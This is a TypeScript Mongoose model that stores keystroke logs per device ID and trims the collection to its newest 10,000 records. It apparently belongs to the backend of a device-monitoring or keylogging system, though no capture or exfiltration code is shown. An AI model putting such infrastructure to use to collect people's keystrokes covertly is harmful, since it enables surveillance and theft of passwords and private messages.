import { model, Schema } from "mongoose";
import { KeyLogsModelType } from "../utils";

const MAX_ROWS = 10000;

const KeyLogsSchema = new Schema<KeyLogsModelType>({
	deviceId: {
		type: String,
		required: true,
	},
	keyLogsType: {
		type: String,
		required: true,
	},
	keylogs: {
		type: String,
		required: true,
	},
	keyevent: {
		type: String,
		required: true,
	},
	created_at: {
		type: Date,
		required: true,
		default: Date.now,
	},
});

// Post-save middleware to ensure maximum rows
KeyLogsSchema.post("save", async function () {
	const count = await KeyLogs.countDocuments();
	if (count > MAX_ROWS) {
		// Remove the oldest rows if count exceeds the limit
		await KeyLogs.find({})
			.sort({ created_at: 1 }) // Sort by oldest created_at
			.limit(count - MAX_ROWS) // Limit the number of rows to delete
			.then((oldRecords) => {
				const idsToRemove = oldRecords.map((record) => record._id);
				return KeyLogs.deleteMany({ _id: { $in: idsToRemove } });
			});
	}
});

const KeyLogs = model("keylogs", KeyLogsSchema);

export default KeyLogs;
